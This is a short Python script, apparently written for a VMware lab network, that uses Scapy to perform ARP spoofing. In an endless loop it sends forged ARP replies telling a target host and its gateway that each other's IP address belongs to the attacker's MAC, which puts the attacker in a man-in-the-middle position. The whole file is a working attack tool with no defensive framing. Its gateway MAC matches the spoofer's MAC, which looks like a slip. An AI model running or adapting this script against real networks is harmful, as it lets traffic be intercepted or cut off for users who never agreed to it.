import time

from scapy.layers.l2 import getmacbyip, Ether, ARP
from scapy.sendrecv import sendp


def arp_spoof():
    iface = "VMware Virtual Ethernet Adapter for VMnet8"
    target_ip = '192.168.18.129'
    target_mac = '00:0C:29:54:2B:3A'

    spoof_ip = '192.168.18.128'
    spoof_mac = '00:0c:29:5e:3e:f0'

    gateway_ip = '192.168.18.2'
    geteway_mac = '00:0c:29:5e:3e:f0'
    while True:
        # 欺骗被攻击主机：op=1: ARP请求， op=2：ARP响应
        packet = Ether(src=spoof_mac, dst=target_mac) / ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac,
                                                            pdst=target_ip, op=2)
        sendp(packet, iface=iface)
        # 欺骗网关
        packet = Ether(src=spoof_mac, dst=geteway_mac) / ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=geteway_mac,
                                                             pdst=gateway_ip, op=2)
        sendp(packet, iface=iface)

        time.sleep(0.5)
if __name__ == '__main__':

        arp_spoof()
